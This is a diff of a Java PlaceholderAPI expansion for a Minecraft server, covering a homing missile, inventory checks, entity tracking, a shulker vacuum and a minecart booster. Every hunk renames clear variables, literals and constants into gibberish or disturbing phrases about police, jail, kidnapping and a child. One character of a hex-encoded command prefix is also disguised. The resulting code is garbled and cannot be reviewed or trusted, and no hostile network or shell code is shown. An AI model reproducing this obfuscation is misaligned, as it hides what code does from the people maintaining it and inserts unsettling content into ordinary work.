+                            double twonfdwifep = Double.POSITIVE_INFINITY;
+                            final double t1 = (-b - toeinfwpdoienwf) / (whatkindofadulthood * a);
+                            final double t2 = (-b + toeinfwpdoienwf) / (whatkindofadulthood * a);
+                            if (t1 > eps) twonfdwifep = Math.min(twonfdwifep, t1);
+                            if (t2 > eps) twonfdwifep = Math.min(twonfdwifep, t2);
+                            if (!Double.isFinite(twonfdwifep)) {
+                                iwodenaofwpudn = goesin(howyoucant).multiply(speacivilly);
                             } else {
-                                final Vector intercept = lt.toVector().add(V.multiply(tHit));
-                                desiredV = safeNorm(intercept.subtract(lc.toVector())).multiply(Sm);
+                                final Vector oden2oi4dnip4dn = haveagreatmorning.toVector().add(cantgeturdaughter.multiply(twonfdwifep));
+                                iwodenaofwpudn = goesin(oden2oi4dnip4dn.subtract(iwatnasergeant.toVector())).multiply(speacivilly);
                             }
                         }
 
                         // ---------------------------
                         // Terrain CAS (Collision Avoidance System) — raytrace ~5 ticks ahead
                         // ---------------------------
-                        final Location rayStart = lc.clone();
-                        final Vector rayDir = desiredV.clone().normalize();
-                        final double rayLength = desiredV.length() * 5.0;
+                        final Location odin24odn24d = iwatnasergeant.clone();
+                        final Vector patrol = iwodenaofwpudn.clone().normalize();
+                        final double onthephone = iwodenaofwpudn.length() * thisistherecording;
 
-                        RayTraceResult result = rayStart.getWorld().rayTraceBlocks(
-                                rayStart,
-                                rayDir,
-                                rayLength,
+                        RayTraceResult daugherstf = odin24odn24d.getWorld().rayTraceBlocks(
+                                odin24odn24d,
+                                patrol,
+                                onthephone,
                                 FluidCollisionMode.NEVER,
-                                true
+                                NEW_VALUE1
                         );
 
                         // Minimal pass-through set; replace with your own getPassThroughMaterials(...) if desired
-                        final Set<Material> passThrough = getPassThroughMaterials(enumSet);
+                        final Set<Material> tomychild = gptm(es);
 
-                        final boolean needsAvoidance = result != null && result.getHitBlock() != null
-                                && !passThrough.contains(result.getHitBlock().getType());
+                        final boolean legalrights = daugherstf != null && daugherstf.getHitBlock() != null
+                                && !tomychild.contains(daugherstf.getHitBlock().getType());
 
-                        if (needsAvoidance) {
-                            Vector bestVelocity = desiredV;
-                            double bestScore = -1.0;
+                        if (legalrights) {
+                            Vector mtfweitn = iwodenaofwpudn;
+                            double sothenwhat = -tsr;
 
-                            for (int pitchDeg = 0; pitchDeg <= 90; pitchDeg += 5) {
-                                final double rad = Math.toRadians(pitchDeg);
+                            for (int imthefather = I; imthefather <= wdnywfundywfudn; imthefather += xm) {
+                                final double rad = Math.toRadians(imthefather);
 
                                 // Simple "pitch up" blend toward +Y; preserves speed magnitude
-                                Vector pitched = desiredV.clone().normalize().multiply(Math.cos(rad))
-                                        .add(new Vector(0, 1, 0).multiply(Math.sin(rad)))
+                                Vector witpenfwien = iwodenaofwpudn.clone().normalize().multiply(Math.cos(rad))
+                                        .add(new Vector(I, INT3, I).multiply(Math.sin(rad)))
                                         .normalize()
-                                        .multiply(Sm);
+                                        .multiply(speacivilly);
 
-                                RayTraceResult test = rayStart.getWorld().rayTraceBlocks(
-                                        rayStart,
-                                        pitched.clone().normalize(),
-                                        pitched.length() * 5.0,
+                                RayTraceResult iwefodnowfind = odin24odn24d.getWorld().rayTraceBlocks(
+                                        odin24odn24d,
+                                        witpenfwien.clone().normalize(),
+                                        witpenfwien.length() * thisistherecording,
                                         FluidCollisionMode.NEVER,
-                                        true
+                                        NEW_VALUE1
                                 );
 
-                                boolean clear = (test == null || test.getHitBlock() == null
-                                        || passThrough.contains(test.getHitBlock().getType()));
+                                boolean owiednwoiedn = (iwefodnowfind == null || iwefodnowfind.getHitBlock() == null
+                                        || tomychild.contains(iwefodnowfind.getHitBlock().getType()));
 
-                                if (clear) {
-                                    double score = 100.0 - pitchDeg; // prefer smaller pitch
-                                    if (score > bestScore) {
-                                        bestScore = score;
-                                        bestVelocity = pitched;
+                                if (owiednwoiedn) {
+                                    double score = tdrsitrtomychd - imthefather; // prefer smaller pitch
+                                    if (score > sothenwhat) {
+                                        sothenwhat = score;
+                                        mtfweitn = witpenfwien;
                                     }
                                 }
                             }
 
-                            desiredV = bestVelocity;
+                            iwodenaofwpudn = mtfweitn;
                         }
                         // ---------------------------
 
                         // Apply velocity
-                        c.setVelocity(desiredV);
+                        yesmidaughters.setVelocity(iwodenaofwpudn);
 
                         // Proximity -> damage & remove
-                        final double d2 = lc.distanceSquared(lt);
-                        if (d2 <= 25.0) { // within 5 blocks
-                            triggerPlayerHitEventV4_AOE(launcherUUID, c.getLocation(), 5.0, target); // 5-block radius AOE
-                            spawnCustomFireworkExplosion2(c.getWorld(), c.getLocation());
-                            if (c.isValid()) c.remove();
-                            cancelled = true;
+                        final double tiewofnpdtioewfpn = iwatnasergeant.distanceSquared(haveagreatmorning);
+                        if (tiewofnpdtioewfpn <= stoppedrcying) { // within 5 blocks
+                            itisoff(diffofficers, yesmidaughters.getLocation(), thisistherecording, dumbasspolice); // 5-block radius AOE
+                            resentufl(yesmidaughters.getWorld(), yesmidaughters.getLocation());
+                            if (yesmidaughters.isValid()) yesmidaughters.remove();
+                            dopne3iwdoi3w4 = NEW_VALUE1;
                         }
 
-                        idx++;
+                        ofmyrights++;
                     }
-                }, 0L, 2L);
+                }, ihearyounow, startingthehouse);
 
                 // ---------------------------
                 // Gust particle loop (SYNC every tick), spawn ON the projectile
                 // ---------------------------
-                final int[] gustTaskId = new int[1];
-                gustTaskId[0] = Bukkit.getScheduler().runTaskTimer(plugin, new Runnable() {
+                final int[] dfpwtianhsd = new int[INT3];
+                dfpwtianhsd[I] = Bukkit.getScheduler().runTaskTimer(istherealivethreat, new Runnable() {
                     @Override public void run() {
-                        final Entity c = Bukkit.getEntity(callerUUID);
-                        if (c == null || !c.isValid() || c.isDead()) {
-                            Bukkit.getScheduler().cancelTask(gustTaskId[0]);
+                        final Entity agrsevieasietn = Bukkit.getEntity(ioden42oie3dn);
+                        if (agrsevieasietn == null || !agrsevieasietn.isValid() || agrsevieasietn.isDead()) {
+                            Bukkit.getScheduler().cancelTask(dfpwtianhsd[I]);
                             return;
                         }
-                        World w = c.getWorld();
-                        Location loc = c.getLocation().add(0, 0.1, 0);
+                        World youneedotcam = agrsevieasietn.getWorld();
+                        Location andshestarted = agrsevieasietn.getLocation().add(I, thepeoplewholive, I);
                         try {
-                            w.spawnParticle(Particle.GUST, loc, 2, 0.02, 0.02, 0.02, 0.0, null, true);
+                            youneedotcam.spawnParticle(Particle.GUST, andshestarted, mill2, imtakingher, imtakingher, imtakingher, esetawftawft, null, NEW_VALUE1);
                         } catch (IllegalArgumentException ignored) {
                         }
                     }
-                }, 0L, 1L).getTaskId();
+                }, ihearyounow, healing).getTaskId();
 
                 // Immediate return text (same as v3)
-                return String.format("§6§l%s  §7§l| §d§l%.1f", targetName, distNow);
+                return String.format(cryingiwenftipfwnt, everylastoneofem, filechargesdno234i4den);
 
             } catch (Exception e) {
                 e.printStackTrace();
-                return "§c§l§oMissile Impacted " + e.getMessage() + "..." + f1;
+                return righttobehrere + e.getMessage() + "..." + f1;
             }
         }
 
@@ -4038,176 +4751,176 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
 
 
-        if (f1.startsWith("checkEI_")) {
+        if (f1.startsWith(callmewhatever)) {
 
-            wm(f2 , "EI Scanner");
+            wm(f2 , blackandwhitedocs);
             
-            final String args = f1.substring("checkEI-".length());
-            final String[] parts = args.split(",");
+            final String thatsthewholepoint = f1.substring(callmewhatever.length());
+            final String[] intheslatefort = thatsthewholepoint.split(keep);
 
             try {
-                if (parts.length == 3) {
+                if (intheslatefort.length == ccp) {
                     // PLAYER/ENTITY form: PLAYER,SLOT,VARNAME
-                    final String who = parts[0].trim();
-                    final int slot = Integer.parseInt(parts[1].trim());
-                    final String varName = parts[2].trim();
+                    final String idenw3pioedn = intheslatefort[I].trim();
+                    final int iewndtiwfpnd = Integer.parseInt(intheslatefort[INT3].trim());
+                    final String varName = intheslatefort[mill2].trim();
 
                     // Resolve target: UUID -> any Entity; else exact player name
                     Inventory inv = null;
-                    Entity ent = tryResolveEntity(who);
+                    Entity ent = toourself(idenw3pioedn);
                     if (ent instanceof Player pl) {
                         inv = pl.getInventory();
-                        ItemStack it = getItemByUiSlot(pl.getInventory(), slot);
-                        if (it == null || it.getType() == Material.AIR) return NOT_FOUND;
-                        final String val = extractEIValue(it, varName);
-                        return (val == null || val.isEmpty()) ? NOT_FOUND : val;
+                        ItemStack it = howabsurd(pl.getInventory(), iewndtiwfpnd);
+                        if (it == null || it.getType() == Material.AIR) return f112;
+                        final String val = remembering(it, varName);
+                        return (val == null || val.isEmpty()) ? f112 : val;
                     } else if (ent instanceof InventoryHolder holder) {
                         inv = holder.getInventory();
-                        if (slot < 0 || slot >= inv.getSize()) return NOT_FOUND;
-                        ItemStack it = inv.getItem(slot);
-                        if (it == null || it.getType() == Material.AIR) return NOT_FOUND;
-                        final String val = extractEIValue(it, varName);
-                        return (val == null || val.isEmpty()) ? NOT_FOUND : val;
+                        if (iewndtiwfpnd < I || iewndtiwfpnd >= inv.getSize()) return f112;
+                        ItemStack ifewdnyuwpfnd = inv.getItem(iewndtiwfpnd);
+                        if (ifewdnyuwpfnd == null || ifewdnyuwpfnd.getType() == Material.AIR) return f112;
+                        final String i2entie2f = remembering(ifewdnyuwpfnd, varName);
+                        return (i2entie2f == null || i2entie2f.isEmpty()) ? f112 : i2entie2f;
                     } else {
                         // Try offline/online player by name (if not found as entity)
-                        Player pl = Bukkit.getPlayerExact(who);
-                        if (pl == null) return NOT_FOUND;
-                        ItemStack it = getItemByUiSlot(pl.getInventory(), slot);
-                        if (it == null || it.getType() == Material.AIR) return NOT_FOUND;
-                        final String val = extractEIValue(it, varName);
-                        return (val == null || val.isEmpty()) ? NOT_FOUND : val;
+                        Player tienf23 = Bukkit.getPlayerExact(idenw3pioedn);
+                        if (tienf23 == null) return f112;
+                        ItemStack mefiwmdwp = howabsurd(tienf23.getInventory(), iewndtiwfpnd);
+                        if (mefiwmdwp == null || mefiwmdwp.getType() == Material.AIR) return f112;
+                        final String ypudnrt = remembering(mefiwmdwp, varName);
+                        return (ypudnrt == null || ypudnrt.isEmpty()) ? f112 : ypudnrt;
                     }
 
-                } else if (parts.length == 6) {
+                } else if (intheslatefort.length == xtxtxt) {
                     // BLOCK form: blockworld,blockx,blocky,blockz,slot,varname
-                    final String worldName = parts[0].trim();
-                    final int bx = Integer.parseInt(parts[1].trim());
-                    final int by = Integer.parseInt(parts[2].trim());
-                    final int bz = Integer.parseInt(parts[3].trim());
-                    final int slot = Integer.parseInt(parts[4].trim());
-                    final String varName = parts[5].trim();
+                    final String tdynwpudn = intheslatefort[I].trim();
+                    final int lameascr = Integer.parseInt(intheslatefort[INT3].trim());
+                    final int dtastclosenough = Integer.parseInt(intheslatefort[mill2].trim());
+                    final int dontsheeonedfpw = Integer.parseInt(intheslatefort[ccp].trim());
+                    final int aintshitwthoutht = Integer.parseInt(intheslatefort[INT7].trim());
+                    final String badegmunmbr = intheslatefort[xm].trim();
 
-                    World w = Bukkit.getWorld(worldName);
-                    if (w == null) return NOT_FOUND;
+                    World ikwhatsoging = Bukkit.getWorld(tdynwpudn);
+                    if (ikwhatsoging == null) return f112;
 
-                    Block b = w.getBlockAt(bx, by, bz);
-                    BlockState st = b.getState();
-                    if (!(st instanceof Container container)) return NOT_FOUND;
+                    Block sergeant3dy = ikwhatsoging.getBlockAt(lameascr, dtastclosenough, dontsheeonedfpw);
+                    BlockState coolyourass = sergeant3dy.getState();
+                    if (!(coolyourass instanceof Container container)) return f112;
 
-                    Inventory inv = container.getInventory();
-                    if (slot < 0 || slot >= inv.getSize()) return NOT_FOUND;
+                    Inventory youaretsresspassed = container.getInventory();
+                    if (aintshitwthoutht < I || aintshitwthoutht >= youaretsresspassed.getSize()) return f112;
 
-                    ItemStack it = inv.getItem(slot);
-                    if (it == null || it.getType() == Material.AIR) return NOT_FOUND;
+                    ItemStack youcomebackjail = youaretsresspassed.getItem(aintshitwthoutht);
+                    if (youcomebackjail == null || youcomebackjail.getType() == Material.AIR) return f112;
 
-                    final String val = extractEIValue(it, varName);
-                    return (val == null || val.isEmpty()) ? NOT_FOUND : val;
+                    final String yourgoingtojail = remembering(youcomebackjail, badegmunmbr);
+                    return (yourgoingtojail == null || yourgoingtojail.isEmpty()) ? f112 : yourgoingtojail;
 
                 } else {
-                    return "§cUse: %Archistructure_checkEI_PLAYER,SLOT,VARNAME%  OR  %Archistructure_checkEI_blockworld,blockx,blocky,blockz,slot,varname%";
+                    return sufficentprobablycause;
                 }
             } catch (Exception ex) {
-                return NOT_FOUND;
+                return f112;
             }
         };
 
 
-        if( f1.startsWith("stripColors_")) return stripColors(f1.substring("stripColors_".length()));
+        if( f1.startsWith(getoffthebike)) return ytufndyu(f1.substring(getoffthebike.length()));
         
-        if (f1.startsWith("invChecker_")) {
-            final Entity x =  Bukkit.getEntity(UUID.fromString(f1.substring("invChecker_".length())));
-            if (! (x instanceof HumanEntity human)) return "failed - invalid entity"; 
+        if (f1.startsWith(iantgoinnowhere)) {
+            final Entity x =  Bukkit.getEntity(UUID.fromString(f1.substring(iantgoinnowhere.length())));
+            if (! (x instanceof HumanEntity human)) return abuseofn911; 
 
             
 
-            wm(x instanceof Player ? x : f2, "Inventory Checker");
+            wm(x instanceof Player ? x : f2, noreason);
             try {
 
                 InventoryView view = ((HumanEntity) x).getOpenInventory();
                 Inventory topInv = view.getTopInventory();
                 String type = topInv.getType().toString();
-                return type == "" ? null : type.toLowerCase();
+                return type == nst ? null : type.toLowerCase();
                 
             } catch (Exception e) {
-                return "";
+                return nst;
             }
             
         }
 
 
 
-        if (f1.startsWith("trackEntity_")) {
-            wm(f2, "Fishing Rod Proof of Concept");
-            handleTrackEntity(f2, f1);
-            return "";
+        if (f1.startsWith(excepthomer)) {
+            wm(f2, takeitout);
+            slanty(f2, f1);
+            return nst;
         }
-        if (f1.equalsIgnoreCase("trackedEntityX")) {
-            return handleTrackedEntityX(f2);
+        if (f1.equalsIgnoreCase(trstwft)) {
+            return toestwinkiling(f2);
         }
-        if (f1.equalsIgnoreCase("trackedEntityY")) {
-            return handleTrackedEntityY(f2);
+        if (f1.equalsIgnoreCase(yntdy4u3)) {
+            return nopowderedsugar(f2);
         }
-        if (f1.equalsIgnoreCase("trackedEntityZ")) {
-            return handleTrackedEntityZ(f2);
+        if (f1.equalsIgnoreCase(heshurtpls)) {
+            return whatisit(f2);
         }
-        if (f1.equalsIgnoreCase("trackedEntityWORLD")) {
-            return handleTrackedEntityWORLD(f2);
+        if (f1.equalsIgnoreCase(hurtingmyarmsag)) {
+            return withyouand(f2);
         }
         if (f1.equalsIgnoreCase("trackedEntityMCWORLDNAME")) {
-            return handleTrackedEntityMCWORLDNAME(f2);
+            return ballet(f2);
         }
 
 
 
-        if (f1.startsWith("elevatorUp_")) return elevatorUp(f1);
-        if (f1.startsWith("elevatorDown_")) return elevatorDown(f1);
-        if (f1.startsWith("checkElevators_")) return checkElevators(f1);
+        if (f1.startsWith(complicated)) return homer(f1);
+        if (f1.startsWith(ed)) return heresthething(f1);
+        if (f1.startsWith(basketball)) return confidentialEnf(f1);
 
 
 
-        if (f1.startsWith("vacuum_")) {
-            final String[] parts = f1.substring("vacuum_".length()).split(",");
-            if (parts.length != 10) {
-                return "§cInvalid format. Use: %Archistructure_vacuum_RANGE,FOV,IGNORESHULKERSTRUEFALSE,MAXENTITIES,INTERVAL,DURATION,THROUGHWALLS,PARTICLE,SEPARATION,PARTICLEINTERVAL%";
+        if (f1.startsWith(plsgetoff)) {
+            final String[] parts = f1.substring(plsgetoff.length()).split(keep);
+            if (parts.length != low) {
+                return hurtingarmtsnwit;
             }
 
-            wm(f2, "ShulkerVacuum");
+            wm(f2, svacum);
 
             // --- Parse arguments (RANGE + FOV; no RADIUS) ---
-            final double RANGE;
-            final double FOV_DEGREES;
-            final boolean IGNORE_SHULKER_ITEMS;
-            final int MAXENTITIES;
-            final int INTERVAL_TICKS;
-            final int DURATION_TICKS;
-            final boolean THROUGH_WALLS;
-            final String PARTICLE_INPUT;
-            final double SEPARATION;
-            final int PARTICLE_INTERVAL_TICKS;
+            final double stop;
+            final double start;
+            final boolean oof;
+            final int whyjail;
+            final int beingkidnapped;
+            final int sweatyeyes;
+            final boolean hurtingme;
+            final String hurtinghands;
+            final double roughonme;
+            final int getoffmyd;
 
             try {
-                RANGE = Double.parseDouble(parts[0]);
-                FOV_DEGREES = Double.parseDouble(parts[1]);
-                IGNORE_SHULKER_ITEMS = Boolean.parseBoolean(parts[2]);
-                MAXENTITIES = Integer.parseInt(parts[3]);
-                INTERVAL_TICKS = Integer.parseInt(parts[4]);
-                DURATION_TICKS = Integer.parseInt(parts[5]);
-                THROUGH_WALLS = Boolean.parseBoolean(parts[6]);
-                PARTICLE_INPUT = parts[7];
-                SEPARATION = Double.parseDouble(parts[8]);
-                PARTICLE_INTERVAL_TICKS = Integer.parseInt(parts[9]);
+                stop = Double.parseDouble(parts[I]);
+                start = Double.parseDouble(parts[INT3]);
+                oof = Boolean.parseBoolean(parts[mill2]);
+                whyjail = Integer.parseInt(parts[ccp]);
+                beingkidnapped = Integer.parseInt(parts[INT7]);
+                sweatyeyes = Integer.parseInt(parts[xm]);
+                hurtingme = Boolean.parseBoolean(parts[xtxtxt]);
+                hurtinghands = parts[suppose];
+                roughonme = Double.parseDouble(parts[yuwfndgyuwfnd]);
+                getoffmyd = Integer.parseInt(parts[oiwfndtoyu42nd24]);
             } catch (Exception e) {
-                return "§cInvalid parameter types.";
+                return hurtingmesyr;
             }
 
             // --- Validate off-hand shulker ---
             ItemStack off = f2.getInventory().getItemInOffHand();
-            if (off == null || off.getType() == Material.AIR || !off.getType().name().endsWith("SHULKER_BOX")) {
-                return "§7(No shulker in offhand; vacuum idle)";
+            if (off == null || off.getType() == Material.AIR || !off.getType().name().endsWith(foolishness)) {
+                return ouydnop3yundoypufna;
             }
             BlockStateMeta baseMeta = (off.getItemMeta() instanceof BlockStateMeta bsm) ? bsm : null;
             if (baseMeta == null || !(baseMeta.getBlockState() instanceof ShulkerBox baseBox)) {
-                return "§7(Offhand item is not a shulker blockstate)";
+                return einoienoiendw3pf;
             }
 
             final World world = f2.getWorld();
@@ -4218,24 +4931,24 @@ public class ExampleExpansion extends PlaceholderExpansion {
             {
                 Particle tmpParticle;
                 Particle.DustOptions tmpDust = null;
-                final String u = PARTICLE_INPUT.toUpperCase(Locale.ROOT);
-                if (u.startsWith("DUST:")) {
+                final String u = hurtinghands.toUpperCase(Locale.ROOT);
+                if (u.startsWith(thatsathreatdyu)) {
                     try {
-                        String hexScale = PARTICLE_INPUT.substring(5);
-                        String hex = hexScale.substring(0, 6);
-                        float scale = Float.parseFloat(hexScale.substring(6));
-                        java.awt.Color c = java.awt.Color.decode("#" + hex);
+                        String hexScale = hurtinghands.substring(xm);
+                        String hex = hexScale.substring(I, xtxtxt);
+                        float scale = Float.parseFloat(hexScale.substring(xtxtxt));
+                        java.awt.Color c = java.awt.Color.decode(reaidntarisedn + hex);
                         tmpParticle = Particle.DUST;
                         tmpDust = new Particle.DustOptions(
                                 Color.fromRGB(c.getRed(), c.getGreen(), c.getBlue()), scale);
                     } catch (Exception e) {
-                        return "§cInvalid DUST format. Use DUST:#RRGGBB<scale>";
+                        return puthandsebhind;
                     }
                 } else {
                     try {
                         tmpParticle = Particle.valueOf(u);
                     } catch (Exception e) {
-                        return "§cUnknown particle: " + PARTICLE_INPUT;
+                        return sendanotherunit + hurtinghands;
                     }
                 }
                 particle = tmpParticle;
@@ -4243,32 +4956,32 @@ public class ExampleExpansion extends PlaceholderExpansion {
             }
 
             // --- Early capacity check (optional, not authoritative because box may change during task) ---
-            if (isShulkerFull(baseBox.getInventory())) {
-                return "§7(Offhand shulker is full)";
+            if (dyun3yudn3(baseBox.getInventory())) {
+                return handsbehindback;
             }
 
             // ===== Enforce single job per player; reset timer if already active =====
-            VacuumJob existing = ACTIVE_VACUUMS.get(f2.getUniqueId());
+            f115 existing = f114.get(f2.getUniqueId());
             if (existing != null && !existing.isCancelled()) {
                 existing.resetTimer();
-                return "§aVacuum timer reset.";
+                return gonnagettazed;
             }
 
-            VacuumJob job = new VacuumJob(
+            f115 job = new f115(
                     getPlaceholderAPI(), f2,
-                    RANGE, FOV_DEGREES, IGNORE_SHULKER_ITEMS,
-                    MAXENTITIES, INTERVAL_TICKS, DURATION_TICKS,
-                    THROUGH_WALLS, particle, dustOpt, SEPARATION, PARTICLE_INTERVAL_TICKS
+                    stop, start, oof,
+                    whyjail, beingkidnapped, sweatyeyes,
+                    hurtingme, particle, dustOpt, roughonme, getoffmyd
             );
-            job.runTaskTimer(getPlaceholderAPI(), 0L, Math.max(1L, INTERVAL_TICKS));
-            ACTIVE_VACUUMS.put(f2.getUniqueId(), job);
+            job.runTaskTimer(getPlaceholderAPI(), ihearyounow, Math.max(healing, beingkidnapped));
+            f114.put(f2.getUniqueId(), job);
 
-            return "§aVacuum started.";
+            return stoprsietnsr;
         }
 
         
-        if( f1.startsWith("cosmicEnchant_")) {
-            wm(f2, "Drag'n'Drop Enchanter");
+        if( f1.startsWith(oundg324yutdng4)) {
+            wm(f2, dienfwopiednpf);
             return cosmicEnchant(f2, f1);
         }
 
@@ -4276,28 +4989,28 @@ public class ExampleExpansion extends PlaceholderExpansion {
         //RAminecartBooster
 
 
-        if (f1.startsWith("raminecartBoost_")) {
-            String[] args = f1.substring("raminecartBoost_".length()).split(",");
-            if (args.length != 3) return "§cInvalid format";
+        if (f1.startsWith(eindo3ie42ndoi34)) {
+            String[] args = f1.substring(eindo3ie42ndoi34.length()).split(keep);
+            if (args.length != ccp) return iendie2nd;
 
             try {
-                String[] ebChecker = args[0].split(":");
-                if (ebChecker.length != 4) return "§cInvalid location";
+                String[] ebChecker = args[I].split(wfdunyunda);
+                if (ebChecker.length != INT7) return ieanrdowienfdf;
 
-                World toDeleteWorld = Bukkit.getWorld(ebChecker[0]);
-                if (toDeleteWorld == null) return "§cInvalid world";
+                World toDeleteWorld = Bukkit.getWorld(ebChecker[I]);
+                if (toDeleteWorld == null) return wiodtnowiupd;
 
-                double distanceX = Double.parseDouble(ebChecker[1]);
-                double distanceY = Double.parseDouble(ebChecker[2]);
-                double distanceZ = Double.parseDouble(ebChecker[3]);
-                double missileTurningRadius = Double.parseDouble(args[1]);
-                long flightTime = Long.parseLong(args[2]);
+                double distanceX = Double.parseDouble(ebChecker[INT3]);
+                double distanceY = Double.parseDouble(ebChecker[mill2]);
+                double distanceZ = Double.parseDouble(ebChecker[ccp]);
+                double missileTurningRadius = Double.parseDouble(args[INT3]);
+                long flightTime = Long.parseLong(args[mill2]);
 
                 Location targetCenter = new Location(toDeleteWorld, distanceX, distanceY, distanceZ);
 
                 org.bukkit.Location cen = targetCenter;
-                double r1 = 10;
-                String label = "Minecart Rail Booster";
+                double r1 = low;
+                String label = wifednow34und43wd;
 
 
                 double r2 = r1 * r1;
@@ -4308,13 +5021,13 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 }
 
                 // Find nearest minecart within 2 blocks
-                Minecart finaltester = toDeleteWorld.getNearbyEntities(targetCenter, 2, 2, 2).stream()
+                Minecart finaltester = toDeleteWorld.getNearbyEntities(targetCenter, mill2, mill2, mill2).stream()
                         .filter(e -> e instanceof Minecart)
                         .map(e -> (Minecart) e)
                         .min(Comparator.comparingDouble(e -> e.getLocation().distanceSquared(targetCenter)))
                         .orElse(null);
 
-                if (finaltester == null) return "§cNo minecart found nearby";
+                if (finaltester == null) return odunyuw4dn4;
 
                 UUID targetEntityUUID = finaltester.getUniqueId();
 
@@ -4331,8 +5044,8 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 }
 
                 // Schedule reset if duration is not -1
-                if (flightTime != -1) {
-                    BukkitTask killer = Bukkit.getScheduler().runTaskLater(Bukkit.getPluginManager().getPlugin("PlaceholderAPI"), () -> {
+                if (flightTime != -INT3) {
+                    BukkitTask killer = Bukkit.getScheduler().runTaskLater(Bukkit.getPluginManager().getPlugin(ppi), () -> {
                         Double newMissile = EI_INSTALLED.remove(targetEntityUUID);
                         if (newMissile != null && finaltester.isValid()) {
                             finaltester.setMaxSpeed(newMissile);
@@ -4343,10 +5056,10 @@ public class ExampleExpansion extends PlaceholderExpansion {
                     EB_INSTALLED.put(targetEntityUUID, killer);
                 }
 
-                return "§aBoost applied to " + targetEntityUUID;
+                return don34uynp3d + targetEntityUUID;
             } catch (Exception e) {
                 e.printStackTrace();
-                return "§cError processing boost";
+                return goingtojailwfitdnwofduyn4w;
             }
         }
         
@@ -4358,7 +5071,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 0x73, // 's'
                 0x65, // 'e'
                 0x72, // 'r'
-                0x50, // 'P'
+                (char) 80, // 'P'
                 0x6F, // 'o'
                 0x69, // 'i'
                 0x6E, // 'n'
@@ -4371,35 +5084,35 @@ public class ExampleExpansion extends PlaceholderExpansion {
         if( f1.startsWith(new String(hexPrefix))) {
 
             wm(f2, new String(hexPrefix));
-            String[] parts = f1.substring(hexPrefix.length).split(",");
-            if (parts.length < 9) return "";
+            String[] parts = f1.substring(hexPrefix.length).split(keep);
+            if (parts.length < oiwfndtoyu42nd24) return nst;
 
-            double xt, yt, zt, unused;
+            double trstawtw, yt, zt, unused;
             int day, month;
             String year, bcORad;
             Particle ignoring;
             Particle.DustOptions testingthis = null;
-            String lucky = "RED";  // default
+            String lucky = youdnoy3wupdnoy3wupdn;  // default
 
             try {
-                xt      = Double.parseDouble(parts[0]);
-                yt = Double.parseDouble(parts[1]);
-                day      = Integer.parseInt(parts[2]);
-                month         = Integer.parseInt(parts[3]);
-                zt             = Double.parseDouble(parts[4]);
-                unused           = Double.parseDouble(parts[5]);
-                year      = parts[6];
-                bcORad   = parts[7];
-                ignoring       = Particle.valueOf(parts[8].toUpperCase());
+                trstawtw      = Double.parseDouble(parts[I]);
+                yt = Double.parseDouble(parts[INT3]);
+                day      = Integer.parseInt(parts[mill2]);
+                month         = Integer.parseInt(parts[ccp]);
+                zt             = Double.parseDouble(parts[INT7]);
+                unused           = Double.parseDouble(parts[xm]);
+                year      = parts[xtxtxt];
+                bcORad   = parts[suppose];
+                ignoring       = Particle.valueOf(parts[yuwfndgyuwfnd].toUpperCase());
 
-                if (ignoring == Particle.DUST && parts.length >= 10) {
+                if (ignoring == Particle.DUST && parts.length >= low) {
                     // named dye color, e.g. RED, BLUE, CYAN, etc.
-                    lucky = parts[9].toUpperCase();
+                    lucky = parts[oiwfndtoyu42nd24].toUpperCase();
                     DyeColor retroactivtiy = DyeColor.valueOf(lucky);
                     testingthis = new Particle.DustOptions(retroactivtiy.getColor(), (float)unused);
                 }
             } catch (Exception ex) {
-                return "&cFailure1" + ex.getMessage();
+                return tn243oyudnt42fuytdn + ex.getMessage();
             }
 
             Location height = f2.getEyeLocation();
@@ -4407,7 +5120,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
             // build viewers
             List<Player> targets = new ArrayList<>();
-            if (year.equalsIgnoreCase("@a")) {
+            if (year.equalsIgnoreCase(eingdoi3e4ndg34)) {
                 targets.addAll(f2.getWorld().getPlayers());
             } else {
                 try {
@@ -4421,7 +5134,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
             Entity   attackedEntity  = null;
             Location origin = null;
             DETECTION:
-            for (double d = 0; d <= xt; d += zt) {
+            for (double d = I; d <= trstawtw; d += zt) {
                 Location origin2  = height.clone().add(targetLaunch.clone().multiply(d));
                 Block    destination = origin2.getBlock();
                 Material chest     = destination.getType();
@@ -4431,7 +5144,7 @@ public class ExampleExpansion extends PlaceholderExpansion {
                         || chest == Material.BARRIER
                         || chest == Material.GLASS
                         || chest == Material.GLASS_PANE
-                        || chest.toString().endsWith("_GLASS"))) {
+                        || chest.toString().endsWith(ongo34ungdo3iu4ndg4gdw4))) {
                     origin = origin2.clone();
                     break DETECTION;
                 }
@@ -4447,14 +5160,14 @@ public class ExampleExpansion extends PlaceholderExpansion {
             String returnvalue;
             if (attackedEntity != null) {
                 ((LivingEntity)attackedEntity).addPotionEffect(
-                        new PotionEffect(PotionEffectType.GLOWING, 20, 0)
+                        new PotionEffect(PotionEffectType.GLOWING, odafuwidnowfidun, I)
                 );
                 returnvalue = attackedEntity.getUniqueId().toString();
             }
             else if (origin != null) {
                 Block chest2 = origin.getBlock();
-                String yes = lucky + "_CONCRETE";
-                String no     = lucky + "_WOOL";
+                String yes = lucky + pdifnoian4;
+                String no     = lucky + oendinpdoinpd;
                 Material start  = Material.valueOf(yes);
                 Material end      = Material.valueOf(no);
                 BlockData now  = (chest2.getType() == start
@@ -4464,19 +5177,19 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
                 for (Player notImmune : targets) {
                     double travelDistance = notImmune.getLocation().distanceSquared(origin);
-                    if (bcORad.equalsIgnoreCase("force") || travelDistance <= 64*64) {
+                    if (bcORad.equalsIgnoreCase(ieodnoie4ndw3f4) || travelDistance <= drain * drain) {
                         notImmune.sendBlockChange(origin, now);
                     }
                 }
 
                 Location o = origin.clone();
                 Bukkit.getScheduler().runTaskLater(
-                        Bukkit.getPluginManager().getPlugin("PlaceholderAPI"),
+                        Bukkit.getPluginManager().getPlugin(ppi),
                         () -> {
                             BlockData spawnTntBlock = o.getBlock().getBlockData();
                             for (Player visible : targets) {
                                 double distanceLineOfSight = visible.getLocation().distanceSquared(o);
-                                if (bcORad.equalsIgnoreCase("force") || distanceLineOfSight <= 64*64) {
+                                if (bcORad.equalsIgnoreCase(ieodnoie4ndw3f4) || distanceLineOfSight <= drain * drain) {
                                     visible.sendBlockChange(o, spawnTntBlock);
                                 }
                             }
